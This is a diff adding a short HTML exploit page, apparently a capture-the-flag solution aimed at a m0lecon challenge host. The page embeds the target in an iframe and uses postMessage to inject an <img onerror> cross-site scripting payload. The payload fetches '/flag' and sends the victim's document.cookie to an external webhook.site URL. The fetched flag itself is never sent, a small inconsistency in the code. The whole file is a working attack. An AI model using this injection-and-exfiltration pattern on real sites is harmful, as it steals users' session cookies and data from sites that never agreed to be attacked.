@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<iframe id="victim"
+  src="62c3f405-3909-4feb-bb61-61c26d2b7d8d.offsec.m0lecon.it/preview"
+></iframe>
+
+<script>
+setTimeout(() => {
+  const frame = document.getElementById("victim");
+
+  frame.contentWindow.postMessage({
+    html: `<img src=x onerror="
+      fetch('/flag')
+        .then(r=>r.text())
+        .then(d=>fetch('https://webhook.site/ce3ad957-cf4e-4cca-a5c8-f4478f521d28?c='+document.cookie))
+    ">`
+  }, "*");
+
+}, 1000);
+</script>
+
+</body>
+</html>
